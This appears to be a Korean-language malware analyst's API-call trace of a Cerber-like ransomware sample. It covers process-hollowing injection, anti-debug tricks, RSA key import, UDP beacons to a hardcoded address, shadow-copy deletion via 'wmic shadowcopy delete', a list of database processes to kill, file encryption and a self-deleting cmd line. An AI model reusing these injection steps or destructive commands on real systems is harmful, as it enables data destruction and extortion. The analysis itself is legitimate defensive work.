Thiophene.sed Handle : DC
SS:[0012F2D8] = Thiophene.sed Handle
GetFileSize() -> 2F54C
GlobalAlloc() -< 2F54C 만큼 -> 167F48

ReadFile() -> 버퍼 167F48에 2F54C만큼 데이터를 복사(Thiophene.sed 파일을 읽음)

GlobalAlloc() -> 286만큼 -> 1974B0
GlobalAlloc() -> 30만큼 -> 1975E8

GetProcAddress() -> Kernel32.dll-ExitProcess -> 7C7EBFA2
GetProcAddress() -> Kernel32.dll-LocalAlloc -> 7C7D9A2D
GetProcAddress() -> kernel32.dll-lstrlenA -> 7C7DBE56
GetProcAddress() -> kernel32.dll-GetCommandLineA -> 7C7E0C6D

GlobalAlloc() -> 16만큼 -> 162A88
LocalAlloc() -> 68만큼 -> 197A80
GetProcAddress() -> kernel32.dll-CreateProcessA -> 7C7D236B 

GetCommandLineA() -> 151EE0
CreateProcessA() -> GetCommandLineA()에서 얻은 값의 프로그램을 CREATE_SUSPENDED 플래그로 생성 -> EAX = 1

GetProcAddress() -> kernel32.dll-VirtualAllocEx -> 7C7D9B12
GetProcAddress() -> kernel32.dll-VirtualAlloc -> 7C7D9AF1

VirtualAlloc() -> 4바이트만큼, MEM_COMMIT, PAGE_READWRIT -> A20000

GetProcAddress() -> kernel32.dll-GetThreadContext -> 7C8097AD
GetThreadContext() <- hThread = F4, pContext = A20000 -> EAX = 1
GetProcAddress() -> kernel32.dll-ReadProcessMemory -> 7C7D21D0

ReadProcessMemory() <- hProcess = F0, BaseAddress = 7FFDF008, Buffer = 12F328, Size = 4 -> Buffer에 00400000 값이 들어감.

GetModuleHandleA() -< ntdll.dll -> 7C930000
GetProcAddress() <- ntdll.dll-NtUnmapViewOfSection -> 

NtUnmapViewOfSection() -> Arg1 = 0F0, Arg2 = 00400000 

VirtualAllocEx() -> hProcess = F0, Address = 00400000, Size = 200704 -> 00400000

GetProcAddress() -> kernel32.dll-WriteProcessMemory -> 7C7D2213

WriteProcessMemory() -> buffer = 169CD1, SIze = 400(1024) -> 이때 169CD1버퍼에는 PE헤더가 있다.

WriteProcessMemory() -> buffer = 1966D1, Size = 200h
WriteProcessMemory() -> buffer = 17C2D1, Size = 1A400h
WriteProcessMemory() -> buffer = 1794D1, Size = 11776h
WriteProcessMemory() -> buffer = 16A0D1, Size = F400h
WriteProcessMemory() -> buffer = 12F30C, Size = 4, 이 버퍼에는 00400000 값이 있다.

GetProcAddress() <- kernel32.dll-SetThreadContext

SetThreadContext() -< A20000

#include <stdio.h>
#include <Windows.h>

int main(void)
{
	CONTEXT s;
	printf("%x\n", &s);
	printf("%x\n", &s.Eip);

	return 0;
}
s.eip - s = b8


7C7E0735 
00150640
004028FD

GetProcAddress() - kernel32.dll-ResumeThread -> 7C802997

GetProcAddress() - kernel32.dll-Sleep -> 7C7D2446

Sleep() <- 10000.m
ResumeThread = 000000F4
ExitProcess() <- null



# New Thread
GetModuleHandleW() <- null -> 00400000
DS:[42E45C] = 00400000 

GetModuleFileNameW() <- hModule = NULL, buffer = 0042E788, Count = 104h -> 반환값 A8, buffer = C:\Documents and Settings\dd\바탕 화면\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913.exe

PathFindFileNameW() <- C:\Documents and Settings\dd\바탕 화면\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913.exe -> 0042E850, a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913.exe

StrCpyNW() <- Dest = 0042E460, Src = C:\Documents and Settings\dd\바탕 화면\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913.exe, Count = 65h
-> 42E460 = C:\Documents and Settings\dd\바탕 화면\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913\

IsBadReadPtr() <- 414c20, size = Ah -> 0
IsBadReadPtr() <- 414c30, size = 1587dh -> 0 

GetLastError() -> 51D
DS:[12FDD0] = 51D

GetCurrentProcessId() -> 2E4
DS:[42F148] = 2E4

GetCurrentProcessId() -> 2E4
DS:[42F148] = 2E4

HeapCreate <- 0, 0, 0 -> 970000
DS:[42ECE4] = 970000

HeapSetInformation() <- 4, 12FDC4, 0, 970000
힙핸들 = 970000
-> 1

GetCurrentProcessId() -> 2E4
DS:[42F148] = 2E4

HeapAlloc() <- Heap = 970000, Flags = 0, Size = 1588Ch -> 980690

memset() <- 995F15, 0, 3 
SetLastError() <- 51D

# SetLastError()에 값을 설정후, GetLastError() 값과 같으면 Debug로 판단되어짐. (Anti Debug)

IsBadReadPtr() <- 414C20, Ah -> 0
IsBadReadPtr() <- 414C30, 1587D -> 0

IsBadWritePtr() <- 980698, 1587D -> 0
IsBadStringPtrA() <- 980698, 1587D -> 980698은 Setting.txt가 담겨져있음.

IsBadWritePtr() <- 12F10, 4 -> 0

GetCurrentProcessId() -> 2E4
DS:[42F180] = 2E4
GetCurrentProcessId() -> 2E4
DS:[42f180] = 2E4

TlsAlloc() -> B
DS:[42F17C] = B
GetCurrentProcessId() -> 2E4
DS:[42F180] = 2E4
GetCurrentProcessId() -> 2E4
DS:[42F180] = 2E4

GetLastError() -> 51D
SS:[12FdCC] = 51D
GetCurrentProcessId() -> 2E4
DS:[42F148] = 2E4

HeapAlloc() <- Heap = 970000, Flags = 8(Heap_zero_memory), size = 64 -> 9966A8

SetLastError() <- 51D

IsBadStringPtrA() <- String = 412894, Maxlen = 4 -> 0

MOV ESI, DWORD PTR DS:[GetCurrentProcessId]
CALL ESI

GetCurrentProcessId() -> 2E4
DS:[42F16C] = 2E4

GetLastError() -> 51D
SS:[12F824] = 51D

IsBadWritePtr() <- Addr = 42F14C, 20h -> 0

GetCurrentProcessId() <- 2E4
InitializeCriticalSection() <- 42F154 -> 0
GetCurrentProcessId() -> 2E4
DS:[42F14C] = 2E4

SetLastError() <- 51D 

GetCurrentProcessId() -> 2E4
DS:[42F16C] = 2E4

IsBadReadPtr() <- Addr = 412894, Size = 4h 

GetLastError() -> 51D
12FAD4 = 51D

IsBadWritePtr <- 42F14C, 20h -> 0

GetCurrentProcessId() -> 2E4

EnterCriticalSection() <- pCriticalSection = 0042F15

GetCurrentThreadId() -> 6AC
DS:[42F150] = 6AC

SetLastError() <- 51D

GetLastError() -> 51D
SS:[12FAE8] = 51D

GetCurrentProcessId() -> 2E4

HeapAlloc() <- 970000, 08, 24h -> 997AA8

SetLastError() <- 51D
memset(12FA11, 0, D9)
memset(12FA11, 0, D9)
memset(12FA11, 0, D9)

GetLastError() -> 51D
GetCurrentProcessId() -> 2E4

HeapAlloc() <- 970000, 0, 14h -> 9982A8
memset(9982B5, 0, 3h)

SetLastError() <- 51D

IsBadReadPtr() <- 12FDB8, 4h
IsBadReadPtr() <- 412894, 4h









































MultiByteToWideChar() <- "blacklist"


CreateEventW() -> 64
CreateFile() 자기자신 -> 58
CreaetFileMapping() 68
MapViewOfFile() AD0000

GetFileSize() <- 58 -> 44028
SetFilePointer() <- 58, 44023(44028-5) 
ReadFile() <- 58, buffer = 12FDDC, Size = 5 

SetFilePointer() <- 58, 4401E 
ReadFile() <- 58, 12FDD4, SIze = 5

SetFilePointer() <- 58, 43DAA
ReadFile() <- 58, 9AD2B0 -> 

GetFileAttributesW() <- C:\test\cerber_debug.txt -> -1

debug..?



RegOpenKeyExW() <- hKey = HKEY_LOCAL_MACHINE, SubKey = SOFTWARE\Microsoft\Cryptography

RegQueryValueExW() <- hKey = HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography, Name = "MachineGuid"
-> 0

RegQueryValueExW() <- hKey = {HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ctyptography}, Name = "MachineGuid"}, pData = 009DB068, pDataLen = 12FCE8 ->
pData =  26fc830f-bba5-4622-9164-d62dcc32a8ee

pData는 MachineGuid와 값이 같다.
RegCloseKey()로 위의 핸들을 닫음

얻은 값을 분해..

26fc830f 값을 임시파일 경로에 추가함

---

Setting 파일에서 뭔갈 검색,, 추출...

---
InitializeCriticalSection() <- 42E3E0
GetLastError() -> 3

HeapAlloc() <- 970000, Size = 14h, -> 9AF3E8

SetLastError() <- 3

GetLastError() -> 3

HeapReAlloc() <- 970000, pMem = 9AF3E8, Size = 18h, -> 9AF408


SetLastError() <- 3

GetLastError() -> 3

HeapReAlloc() <- 970000, pMem = 9AF408, Size = 1C -> 9A7FD0

SetLastError() <- 3


.. 반복


CreateFileW() <- ...Temp\26fc830f\bba5.tmp, mode = Read, -> -1






CryptAcquireContextW() <- 42E454, 0, 0, 1, 0F000000 -> 42E454 = 001588D0, EAX = 1


lstrlenA() <- "global_public_key"


Setting 검색 반복...



Setting에서 global_public_key 값을 얻음
키 - 값

LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2a3R5NXFocUV5ZFI5MDc2RmV2cAowdU1QN0laTm1zMUFBN0dQUVVUaE1XYllpRVlJaEJLY1QwL253WXJCcTBPZ3Y3OUsxdHRhDRFSFRyWGdjQXAvCk9KZ0JoejlONThhZXdkNHlaQm0yY29lYURHdmNHUkFjOWU3Mk9iRlEvVE1FL0lvN0xaNXFYRFd6RGFmSThMQTgKSlFtU3owTCsvRytMUFRXZzdrUE9wSlQ3V1NrUmI5VDh3NVFnWlJKdXZ2aEVySE04M2tPM0VMVEgrU29FSTUzcAo0RU5Wd2ZOTkVwT3BucE9PU0tRb2J0SXc1NkNzUUZyaGFjMHNRbE9qZWsvbXVWbHV4amlFbWMwZnN6azJXTFNuCnFyeWlNeXphSTVEV0JEallLWEExdHAyaC95Z2JrWWRGWVJiQUVxd3RMeFQyd01mV1BRSTVPa2hUYTl0WnFEMEgKblFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==


memset() <- 12FD14, 0, 40h

LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJB
추출한후, 12FD14부터 40h만큼 저장

CruptStringToBinaryA() <- 추출한값, 40, 1, 0, 12FD68, 0, 0 -> 1


memset() <- 12FD15, 0, 40h 

다음 RSA키 값
UVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2a3R5NXFocUV5ZFI5MDc2RmV2cAowdU1Q
추출후

CryptStringToBinaryA() <- 12FD14, 40h, 1, 0, 12FD68, 0, 0


.. 끝까지 반복

lstrlen() <- 9A8538, RSA키값


한번더 반복...

한번더 반복...

-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvkty5qhqEydR9076Fevp
0uMP7IZNms1AA7GPQUThMWbYiEYIhBKcT0/nwYrBq0Ogv79K1tta04EHTrXgcAp/
OJgBhz9N58aewd4yZBm2coeaDGvcGRAc9e72ObFQ/TME/Io7LZ5qXDWzDafI8LA8
JQmSz0L+/G+LPTWg7kPOpJT7WSkRb9T8w5QgZRJuvvhErHM83kO3ELTH+SoEI53p
4ENVwfNNEpOpnpOOSKQobtIw56CsQFrhac0sQlOjek/muVluxjiEmc0fszk2WLSn
qryiMyzaI5DWBDjYKXA1tp2h/ygbkYdFYRbAEqwtLxT2wMfWPQI5OkhTa9tZqD0H
nQIDAQAB
-----END PUBLIC KEY-----

lstrlen() <- 위의 값을 얻음
MII부터 시작해서 위의 반복 과정을 거침..

CryptStringToBinaryA() <- ...

한번더 반복...

한번더 반복...


CryptDecodeObjectEx() <- 10001, 8, 9DB068, 126, 8000, 0, 12FDD8, 12FDCC -> 1


GetModuleHandleW() <- crypt32.dll
GetProcAddress() <- Crypt32.dll-CryptImportPublicKeyInfo -> 765D2705

CryptImportPublicKeyInfo() <- 1588D0, 1, 161CA0, 12FDD0
-> 1

LocalFree() <- 161CA

memcpy() <- 9D9158, 9AF450, 4

GetTickCount() -> 2128664

CryptAcquireContextW() <- 12FA10, 0, 0, 1, F0000040
CSP(Cryptographic Service Provide) 핸들 얻기 -> 12fa10 = 00161FE0, EAX = 1

CryptGenRandom() <- 161FE0, 38h, 9D9158 ->
# CryptGenRandom() 함수는 버퍼를 암호학적으로 임의의 바이트로 채웁니다. (hProv, dwLen, pbBuffer)
¶r5™Ooo~ _UT{o≫ a?DEA÷BæAÞ½biUH~y´B&C

CryptReleaseContext() <- 161FE0, 0

memcpy() <- 9DA118, 9D9158(암호화된바이트), 38h

...
memcpy() <- 9D9298, 9AF470, 4h

GetTickCount() -> 21D4D8C


CryptAcquireContextW() <- 12FA10, 0, 0, 1, F0000040
CryptGenRandom() <- 161FE0, 38h, 9D9298



GetKeyboardLayoutList() 

GetFileVersionInfoSizeA() <- kernel32.dll -> 744

inet_addr() <- 194.165.16.0
htons() <- 1AEC
socket() <- 2,2,11

sendto() <- B0, A68248(hi008c1030), A, 0, 12F9F8, 1
sendto() <- 위와 같음
sendto()sendto() + 20

PeekMessageW() 
WaitForSingleObject() <- 7C

sendto()
PeekMessageW() 
WaitForSingleObject() <- 7C
x4

sendto()
peekmessagew()

sendto()
WaitForSingleObject

sendto()
...


Sleep() <- 1000ms
sendto()
Sleep() <- 1000mss
sendto()
Sleep() <- 1000ms
sendto()
...

shutdown <- B0, 2
closesocket() <- B0

GetModuelHandleA() <- kernel32.dll
GetProcAddress() <_ kernel32.dll-IsWow64Process

GetSystemDirectoryA() <- buffer = 12F938 -> C:\Windows\system32

C:\WINDOWS\system32\wbem\wmic.exe

InitializeSecurityDescriptor() <- 12E7C4, 1

CreatePipe() <- phReadPipe = 12F7F8, phWritePipe = 12F804, pSecurity = 12E7BC, Size = 0 -> 1

CreatePipe() <- phReadPipe = 12F800, phWritePipe = 0012F7FC, pSecurity = 0012F7EC, Size = 0 - > 1



GetSystemDirectoryA() 

wsprintfA()를 통해 %s\cmd.exe -> %s에 GetSystemDirectoryA()를 통해 얻은 값을 넣음
즉, C:\Windows\system32\cmd.exe


CreateProcessA() <- cmd.exe, Flag = Create_New_Console, CommandLine = null, 


lstrlen() <- C:\WINDOWS\system32\wbem\wmic.exe

12

WriteFile() <- 10c, 9d91a8 = C:\Windows\system32\wbem\wmic.exe shadowcopy delete

PathFindFileNameA() <- C:\WINDOWS\system32\wbem\wmic.exe

12f849 = wmic.exe

Process32FirstW() <- 114, 12EEc4
StrStrIW() <- wmic.exe
Process32NextW()

-> 이 절차를 통해 wmic.exe프로그램이 실행되었는지 확인하는듯.

GetHandleInformation() <- handle = 114, flag = 12EEB0

CloseHandle() <- 114

RtlGetNativeSystemInformation() <- 5, 9E2850, 8000, 0

VIrtualAlloc() <- 0, 8h, 3000, 4
VirtualProtect() <- DF0000, 8h, 104, 12F0B8

ZwOpenProcess() <- 12F0C0, 1, 12F0A0, DF0000

OpenProcess() Wmic.exe를 염 -> 114
TerminateProcess() Wmic.exe

GetHandleInformation() <- 114
CloseHandle() <- 114
=> Handle이 존재하는지 확인 후 종료

HeapReAlloc() <- 970000, 8h, 9AF828, 18h -> 9AF848

WriteFile() <- 10C, 9AF850(exit), 6h, 12F51C, 0
=> 10C는 CMD로 추정

GetHandleInformation() <- 118
CloseHandle() <- 118

GetHandleInformation() <- 11C
CloseHandle() <- 11C

GetHandleInformation() <- 108
CloseHandle() <- 108


GetHandleInformation() <- B4
CloseHandle() <- B4

GetHandleInformation() <- b0

GetHandleInformation() <- 10C

lstrcmpi() <- encrypt
lstrlen() <- files

HeapAlloc() 9af868

lstrlen() <- .accdb
.mdb




lstrlen() <- 9F6850 [ReadMe 파일]
-> EBD5 크기
...
lstrlen() <- ffoqr3ug7m726zou


DCE7-DF9D-D750-008C-107A


...

RegOpenKeyExW() <- hKey = HKEY_CURRENT_USER, SubKey = Software\Microsoft\Windows\CurrentVersion\Policies\Explorer 

RegQueryValueExW() <- HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
, Name = NoDrives 


GetDriveTypeW() <= C: -> 3
		
QueryDosDeviceW()  <= C:, 12F5D0, 208 -> \Device\HarddiskVolume1

PathCombineW() <- Dest = 12F5B8, Dir = 12FA34(C:), File = "*



FindFirstFileW() <- FileName = "C:\*", pFindData = 0012F364		


WaitForSingleObject() <- 7C, Timeout = null


PathMatchSpecW() <- Path = C:\*, Spec = *:\documents and settings\all users\documents\*
-> 
==> 다른 파일 경로를 많이 비교하면서 이 경로가 해당 경로가 맞는지 비교..

FindNextFileW() <- hFindfile = 00167460, pFinddata = 0012F364
PathMatchSpecW() 
... 반복후

PathCombineW() <- C:\Documents and Settings, File = *
-> C:\Documents and Settings\*
FindFirstFileW() 
... 반복

-- 파일 처리같음

WNetOpenENumW() <- 2, 1, 13, 0, 12F9D4- > 0
[네트워크 드라이버 탐색하는거같음]

WNetEnumResourceW() <- 16E110, 12F9D8, 0AB82F0, 12F9D0

WNetOpenEnumW() <- 2, 1, 13, AB82F0, 12F9A8

..
CreateWellKnownSid() <- 1A, 0, 12F5C8, 12F614 -> 자신을 관리자 권한 상승

CheckTokenMembership() <- 현재 로그인한 계쩡이 관리자 그룹에 속해있는가?

GetHandleInformation()
CloseHandle()
GetHandleInformation()
CloseHandle()

194.165.16.0::22


htonl = FFFFFC00 = -40
inet_addr = 194.165.16.0
htons = 1AEC

socket() <- 2,2, 11

sendto() <- 138, 983550, 18, 12F9F8, 10
dce7df9dd750008c1501101a
x ...


sleep(1000ms)
x5


shutdown <- 138, 2

closesocket() 

		







GetLastError()
InitializeCriticalSection()
GetCurrentProcessId()
SetLastError()

Init

msftesql.exe
sqlagent.exe
sqlbrowser.exe
sqlwriter.exe
oracle.exe
ocssd.exe
dbsnmp.exe
synctime.exe
mydesktopqos.exe
agntsvc.exeisqlplussvc.exe
xfssvccon.exe
mydesktopservice.exe
ocautoupds.exe
agntsvc.exeagntsvc.exe
agntsvc.exeencsvc.exe
firefoxconfig.exe
tbirdconfig.exe
ocomm.exe
mysqld.exe
mysqld-nt.exe
mysqld-opt.exe
dbeng50.exe
sqbcoreservice.exe

sleep 3000ms

GetSystemInfo()

CreateEvent
CreateThread() <- 0, 0, 401153, 0, 0, 0 -> 140

Ollydbg Error

CreateThread() <- 0, 0, 40A02E, 9F6768(CPU Dump
Address   Hex dump                                         ASCII
009F6768  C5 17 40 00|F0 F9 12 00|                         A@ ðu
), 0, 0
-> 144


CreateThread() <- 

EnterCriticalSection() <- 0012F9Fc

C:\Documents and Settings\dd\Cookies\index.dat





CreatFile()
SetFilePointerEX()
ReadFile()

CryptAcquireContextW
CryptGenRandom
CryptReleaseContext

SetFilePointerEX()
WriteFile
CloseFile




CreateFileW
GetFileSizeEx
memset() <- 169F65A, 0, 206h 
GetCurrentProcessId() -> 2E4

SetFilePointerEx() <- 150, 200, 0, 0, 0
ReadFile()

lstrlenW() 파일명

CryptAcquireContextW() <- 169F634, 0, 0, 1, F0000040
CryptGenRandom()
CryptReleaseContext() 


...


바탕화면 바꾸기 -> Readme 띄우기 -> taskkill /f /im "a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913.exe" > NUL & ping -n 1 127.0.0.1 > NUL & del "C:\Documents and Settings\dd\?? ??\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913.exe" > NUL && exit

cmd.exe 실행

저 문장 실행 및 자기 종료































# 처음부터 분석시작





















GetModuleHandleA() <- SHFOLDER
LoadLibarary() <- SHFOLDER
GetProcAddress() <- SHFOLDER-SHGetFolderPathA()
-> 7673145D

SHGetFileInfo() <- 42A060, 0, 12FE64, 160h, 0
GetCommandLineA() -> "C:\Documents and Settings\dd\¹UAA E­¸e\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913.exe"

GetModuleHandleA(Null) -> 00400000
GetTempPathA() -> C:\DOCUME~1\dd\LOCALS~1\Temp\
CreateDirectoryA() <- ...Temp\

GetTempFileNameA() <- ...Temp\, "nsp", 0, 437000
nsp5.tmp 파일이 생성되어짐

DeleteFileA() <- nsp5.tmp

GetModuleFileNameA() <- hModule = NULL, Buffer = 437C00, Count = 400h -> C:\Documents and Settings\dd\¹UAA E­¸e\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913.exe

GetFileAttributesA() <- C:\Documents and Settings\dd\¹UAA E­¸e\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913.exe -> 20

CreateFileA() <- C:\Documents and Settings\dd\¹UAA E­¸e\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913\a31eb55003834823679085184dbdc0946ffd0037567bd2c088d16e6e95b0d913.exe, 0, 1, 0, 3, 20, 0 -> D4


CharPrevA() <- *.exe 파일 추출

GetFileSize() <- hFile = D4


ReadFile() <- hFile = D4, Buffer = 421C58, 200, 12FDE0, 0

ReadFile() <- D4, 421C58, 200, 12FDE0

ReadFile() <- D4, 421C58, 200, 12FDE0, 0
200
200
200
200
200
200
200
200
